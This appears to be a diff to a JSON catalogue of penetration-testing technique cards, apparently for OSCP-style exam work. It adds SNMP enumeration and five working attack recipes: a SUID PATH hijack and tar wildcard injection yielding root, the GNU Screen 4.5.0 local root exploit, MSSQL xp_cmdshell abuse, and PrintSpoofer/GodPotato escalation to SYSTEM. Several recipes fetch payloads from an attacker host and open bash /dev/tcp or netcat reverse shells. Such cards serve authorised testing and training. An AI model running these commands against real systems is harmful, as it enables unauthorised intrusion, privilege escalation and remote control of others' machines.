@@ -444,6 +444,230 @@
       "examSafe": true,
       "substitutesFor": [],
       "examSafeReason": "Relies only on binaries already present on the host (living off the land); no transfer tooling is uploaded."
+    },
+    {
+      "id": "snmp-community-enum",
+      "cat": "Recon — SNMP community mining",
+      "name": "SNMP Community-String Enumeration (Users / Processes / Creds)",
+      "lang": "bash",
+      "desc": "Walk SNMP with common community strings. SNMPv1/v2c leaks local usernames, running processes (with full command lines — passwords are often on them), installed software and listening ports.",
+      "when": "UDP 161 is open (a plain TCP scan misses it — run `nmap -sU -p161`). Community-string reads need no credentials and frequently hand you usernames to spray or a password sitting in a process argument.",
+      "where": "Run on KALI against the target. snmpwalk often stalls — snmpbulkwalk is faster and more reliable.",
+      "how": "Try the default 'public' community first; if that fails, brute a small list with onesixtyone. Grep the walk for the users table and the running-process table.",
+      "code": "# Fast full walk (public); swap the community if onesixtyone finds another:\nsnmpbulkwalk -c public -v2c {{target}} . 2>/dev/null | tee snmp_{{target}}.txt\n# Just the high-signal tables:\nsnmpbulkwalk -c public -v2c {{target}} 1.3.6.1.4.1.77.1.2.25   # hrSWRunName-style user accounts\nsnmpbulkwalk -c public -v2c {{target}} 1.3.6.1.2.1.25.4.2.1.5  # running processes + args (creds often here)\n# Brute the community string if 'public' is closed:\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{target}}",
+      "execMode": "kali",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Read-only SNMP enumeration with community strings — no exploitation, so it is exam-safe and can run unattended.",
+      "pathProposable": true,
+      "lane": "recon",
+      "prereq": {
+        "any": [
+          "snmp.reachable",
+          "port:161"
+        ]
+      },
+      "produces": [
+        "credential.candidate",
+        "ad.user_list",
+        "host.hostname"
+      ],
+      "evidence": {
+        "card": "snmp-community-enum",
+        "facts": [
+          "credential.candidate",
+          "ad.user_list"
+        ],
+        "expects": [
+          "A users/accounts table (hrSWRunName, or a system users list) records the usernames as candidate accounts to spray.",
+          "A running-process line that carries a password on its command line records a credential.candidate.",
+          "An empty walk or a timeout (wrong community / filtered UDP) records nothing."
+        ]
+      }
+    },
+    {
+      "id": "suid-path-hijack",
+      "cat": "Linux PrivEsc — SUID relative-command PATH hijack",
+      "name": "SUID Binary Relative-Command PATH Hijack",
+      "lang": "bash",
+      "desc": "A SUID-root binary that invokes another program by its bare name (not an absolute path) runs YOUR program as root when you put it earlier in PATH.",
+      "when": "`find / -perm -u=s -type f 2>/dev/null` shows a non-standard SUID binary, and `strings <binary>` shows it calling a command by name (e.g. `chpasswd`, `service`, `cat`) with no leading path.",
+      "where": "Run on the TARGET as the unprivileged user. Start a listener on {{lhost}}:{{lport}} first.",
+      "how": "Write a malicious script named exactly like the bare command the SUID binary calls, put its directory first in PATH, then run the SUID binary — it executes your script as root.",
+      "code": "# Replace CALLED_CMD with the bare command name you saw in `strings <suid-binary>`\ncd /tmp\nprintf '#!/bin/bash\\nbash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\n' > /tmp/CALLED_CMD\nchmod +x /tmp/CALLED_CMD\nexport PATH=/tmp:$PATH        # /tmp is now searched before /usr/bin\n/path/to/the-suid-binary      # it calls CALLED_CMD, which is now yours, as root",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Manual, hand-built PATH hijack — no automated exploitation tool. Standard OSCP-permitted privilege escalation.",
+      "pathProposable": true,
+      "lane": "escalate",
+      "prereq": {
+        "any": [
+          "privesc.suid",
+          "privesc.suid_candidate",
+          "privesc.script_sink"
+        ]
+      },
+      "produces": [
+        "access.root"
+      ],
+      "evidence": {
+        "card": "linux-privesc",
+        "facts": [
+          "access.root"
+        ],
+        "expects": [
+          "A root reverse shell / `id` showing uid=0 after running the SUID binary records root access.",
+          "No shell back (the binary uses an absolute path, or PATH wasn't honoured) records nothing."
+        ]
+      }
+    },
+    {
+      "id": "screen-suid-4506",
+      "cat": "Linux PrivEsc — Screen 4.5.0 setuid",
+      "name": "GNU Screen 4.5.0 Setuid Local Root (CVE-2017-5618 / EDB-41154)",
+      "lang": "bash",
+      "desc": "Setuid GNU Screen 4.5.0 lets an unprivileged user write an arbitrary file as root via a crafted ld.so.preload, yielding a root shell.",
+      "when": "A setuid `screen` is present (`find / -perm -u=s -type f 2>/dev/null` lists it) and its version is 4.5.0 (`screen -v` / `screen-4.5.0`).",
+      "where": "Run on the TARGET. Serve libhax.so and rootshell from {{lhost}} (build them from EDB-41154 on Kali first).",
+      "how": "Fetch the two prebuilt payloads, seed ld.so.preload through the setuid screen, then run the dropped rootshell.",
+      "code": "cd /tmp\nwget -q http://{{lhost}}/libhax.so -O /tmp/libhax.so\nwget -q http://{{lhost}}/rootshell -O /tmp/rootshell\nchmod +x /tmp/rootshell\ncd /etc\numask 000\nscreen-4.5.0 -D -m -L ld.so.preload echo -ne  \"\\x0a/tmp/libhax.so\"   # writes /etc/ld.so.preload as root\nscreen-4.5.0 -ls                                                     # triggers the preload\n/tmp/rootshell                                                      # root shell",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "A single public local-privesc PoC (EDB-41154) run by hand against a specific vulnerable version — OSCP-permitted manual exploitation.",
+      "pathProposable": true,
+      "lane": "escalate",
+      "prereq": {
+        "any": [
+          "privesc.suid",
+          "privesc.suid_candidate"
+        ]
+      },
+      "produces": [
+        "access.root"
+      ],
+      "evidence": {
+        "card": "linux-privesc",
+        "facts": [
+          "access.root"
+        ],
+        "expects": [
+          "`/tmp/rootshell` returning a uid=0 prompt records root access.",
+          "A version mismatch or a patched screen records nothing."
+        ]
+      }
+    },
+    {
+      "id": "mssql-xpcmdshell-shell",
+      "cat": "Lateral — MSSQL xp_cmdshell",
+      "name": "MSSQL xp_cmdshell → Reverse Shell (as the SQL Service Account)",
+      "lang": "bash",
+      "desc": "An MSSQL login that can toggle xp_cmdshell is a direct command-execution path to a shell as the SQL service account — which usually holds SeImpersonatePrivilege (→ SYSTEM).",
+      "when": "You can authenticate to MSSQL: a cracked/reused sql_svc credential, or Windows-auth from a domain foothold. Confirm you can RECONFIGURE (sysadmin or a role that permits it).",
+      "where": "Run impacket-mssqlclient from KALI (through your pivot for an internal DB). Start a listener on {{lhost}}:{{lport}} and serve nc.exe over {{lhost}} first.",
+      "how": "Connect, enable xp_cmdshell, pull nc.exe onto the box, and fire a reverse shell. Then escalate with the potato chain (SeImpersonate).",
+      "code": "impacket-mssqlclient {{domain}}/{{user}}:{{password}}@{{target}} -windows-auth\n-- then, at the SQL> prompt:\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'powershell -c \"iwr http://{{lhost}}/nc.exe -outfile C:\\Users\\Public\\nc.exe\"';\nEXEC xp_cmdshell 'C:\\Users\\Public\\nc.exe -e powershell {{lhost}} {{lport}}';",
+      "execMode": "kali",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Manual use of a built-in DBMS feature (xp_cmdshell) with a valid credential — standard OSCP-permitted lateral movement, no automated exploitation framework.",
+      "pathProposable": true,
+      "lane": "access",
+      "prereq": {
+        "any": [
+          "port:1433",
+          "mssql.reachable"
+        ]
+      },
+      "produces": [
+        "access.shell",
+        "foothold.windows"
+      ],
+      "evidence": {
+        "card": "mssql-xpcmdshell",
+        "facts": [
+          "access.shell"
+        ],
+        "expects": [
+          "A caught reverse shell (whoami showing the SQL service account, e.g. nt service\\mssql$...) records shell access.",
+          "`xp_cmdshell` disabled with no permission to RECONFIGURE, or login failed, records nothing."
+        ]
+      }
+    },
+    {
+      "id": "seimpersonate-potato",
+      "cat": "Windows PrivEsc — SeImpersonate potato chain",
+      "name": "SeImpersonatePrivilege → SYSTEM (PrintSpoofer, then GodPotato)",
+      "lang": "powershell",
+      "desc": "A token with SeImpersonatePrivilege (common on service accounts: IIS, MSSQL, freeswitch) can be abused to run code as SYSTEM. PrintSpoofer is the quiet first try; GodPotato is the fallback on patched/newer builds where PrintSpoofer fails.",
+      "when": "`whoami /priv` shows SeImpersonatePrivilege (or SeAssignPrimaryToken) Enabled. Typical right after landing a shell as a service account via a web/DB exploit.",
+      "where": "Run on the TARGET. Fetch the .exe from {{lhost}}. For a shell instead of a one-shot command, point -c/-cmd at a reverse-shell command.",
+      "how": "Try PrintSpoofer first; if it errors (no spooler / patched), fall back to GodPotato, matching the .NET build on the box.",
+      "code": "# 1) PrintSpoofer (first choice):\niwr http://{{lhost}}/PrintSpoofer64.exe -outfile C:\\Users\\Public\\ps.exe\nC:\\Users\\Public\\ps.exe -i -c \"powershell -ep bypass\"\n# 2) Fallback - GodPotato (pick the NET4 build to match the host):\niwr http://{{lhost}}/GodPotato-NET4.exe -outfile C:\\Users\\Public\\gp.exe\nC:\\Users\\Public\\gp.exe -cmd \"cmd /c whoami\"\nC:\\Users\\Public\\gp.exe -cmd \"cmd /c C:\\Users\\Public\\nc.exe -e cmd {{lhost}} {{lport}}\"",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Public single-purpose privilege-escalation PoCs (PrintSpoofer/GodPotato) run by hand against a token privilege — OSCP-permitted manual exploitation.",
+      "pathProposable": true,
+      "lane": "escalate",
+      "prereq": {
+        "any": [
+          "privesc.windows_privilege",
+          "access.command_exec",
+          "foothold.windows"
+        ]
+      },
+      "produces": [
+        "access.system"
+      ],
+      "evidence": {
+        "card": "win-privesc",
+        "facts": [
+          "access.system"
+        ],
+        "expects": [
+          "A shell / command output showing `nt authority\\system` records SYSTEM access.",
+          "PrintSpoofer erroring AND GodPotato erroring (no SeImpersonate, or wrong .NET build) records nothing — try the other potato variant."
+        ]
+      }
+    },
+    {
+      "id": "tar-wildcard-injection",
+      "cat": "Linux PrivEsc — wildcard / tar checkpoint injection",
+      "name": "tar Wildcard --checkpoint-action Injection",
+      "lang": "bash",
+      "desc": "A root cron/scheduled job that runs `tar` with a wildcard (`tar ... *`) inside a directory you can write to expands your crafted filenames into tar OPTIONS — --checkpoint-action lets you run a command as root.",
+      "when": "pspy (or a cron listing) shows root periodically running `tar` with a `*` in a directory you can write to (classic backup job). Also applies to a wildcard `chown`/`chmod`/`rsync`.",
+      "where": "Run on the TARGET, inside the directory the root job archives. Watch the job fire with ./pspy64.",
+      "how": "Drop a payload script plus two files whose NAMES are tar options; when root's tar globs the directory, it treats them as flags and executes your action as root.",
+      "code": "cd /the/writable/dir/that/root/tar/globs\n# payload: SUID a root bash (or a reverse shell to {{lhost}}:{{lport}})\nprintf 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\\n' > shell.sh\n# filenames that become tar options when the wildcard expands:\necho '' > '--checkpoint=1'\necho '' > '--checkpoint-action=exec=sh shell.sh'\n# wait for the root tar job to run (watch ./pspy64), then:\n/tmp/rootbash -p   # euid=0 -> id",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Manual, hand-crafted wildcard injection abusing a misconfigured root job — no automated exploitation tool. Standard OSCP-permitted privilege escalation.",
+      "pathProposable": true,
+      "lane": "escalate",
+      "prereq": {
+        "any": [
+          "privesc.cron_writable",
+          "privesc.process_lead",
+          "privesc.script_sink"
+        ]
+      },
+      "produces": [
+        "access.root"
+      ],
+      "evidence": {
+        "card": "linux-privesc",
+        "facts": [
+          "access.root"
+        ],
+        "expects": [
+          "`/tmp/rootbash -p` giving euid=0 (or a caught root reverse shell) records root access.",
+          "The tar job not using a wildcard, or the directory not being writable, records nothing."
+        ]
+      }
     }
   ]
 }
